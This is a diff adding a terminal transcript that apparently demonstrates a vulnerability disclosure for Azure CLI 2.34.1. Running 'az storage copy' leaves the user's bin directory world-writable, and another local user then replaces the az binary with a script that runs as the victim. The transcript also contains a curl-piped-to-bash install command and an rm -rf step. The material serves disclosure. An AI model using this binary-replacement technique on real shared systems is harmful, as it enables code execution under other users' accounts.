@@ -1,0 +1,56 @@
+# Remove existing install
+victim@scw-angry-chandrasekhar:~$ rm -rf bin/ lib/
+
+# Install a fresh copy of the az cli
+victim@scw-angry-chandrasekhar:~$ curl -L https://aka.ms/InstallAzureCli | bash
+[installation transcript removed]
+-- Installation successful.
+-- Run the CLI with /home/victim/bin/az --help
+
+# bin/ has reasonable permissions
+victim@scw-angry-chandrasekhar:~$ ls -lad bin
+drwxrwxr-x 2 victim victim 4096 Mär 17 14:07 bin
+
+# Invoke "az storage copy" to trigger the behavior
+
+victim@scw-angry-chandrasekhar:~$ az storage copy
+Positional argument '<EXTRA_OPTIONS>' is experimental and under development. Reference and support levels: https://aka.ms/CLI_refstatus
+Azcopy command: ['/home/victim/bin/azcopy', 'copy', 'https://None.blob.core.windows.net', 'https://None.blob.core.windows.net']
+INFO: Scanning...
+
+failed to perform copy command due to error: Login Credentials missing. No SAS token or OAuth token is present and the resource is not public
+Failed to perform copy operation.
+
+
+
+# bin/ is now world writeable
+victim@scw-angry-chandrasekhar:~$ ls -lad bin
+drwxrwxrwx 2 victim victim 4096 Mär 17 14:09 bin
+
+# version info
+victim@scw-angry-chandrasekhar:~$ az version
+{
+  "azure-cli": "2.34.1",
+  "azure-cli-core": "2.34.1",
+  "azure-cli-telemetry": "1.0.6",
+  "extensions": {}
+}
+
+
+# ATTACKER ACTIVITY BEGINS HERE - note different user
+
+# This means the attacker cannot directly overwrite the files inside...
+attacker@scw-angry-chandrasekhar:/home/victim/bin$ echo -ne '#!/bin/bash\necho "IF YOU READ THIS YOU ($(whoami)) ARE PWNED"' > /home/victim/bin/az
+bash: /home/victim/bin/az: Permission denied
+
+# ... but they can first delete then recreate it!
+attacker@scw-angry-chandrasekhar:/home/victim/bin$ rm /home/victim/bin/az
+rm: remove write-protected regular file '/home/victim/bin/az'? y
+attacker@scw-angry-chandrasekhar:/home/victim/bin$ echo -ne '#!/bin/bash\necho "IF YOU READ THIS YOU ($(whoami)) ARE PWNED"' > /home/victim/bin/az
+attacker@scw-angry-chandrasekhar:/home/victim/bin$ chmod +x /home/victim/bin/az
+
+
+# BACK TO THE VICTIM ACCOUNT!
+
+victim@scw-angry-chandrasekhar:~$ az version
+IF YOU READ THIS YOU (victim) ARE PWNED
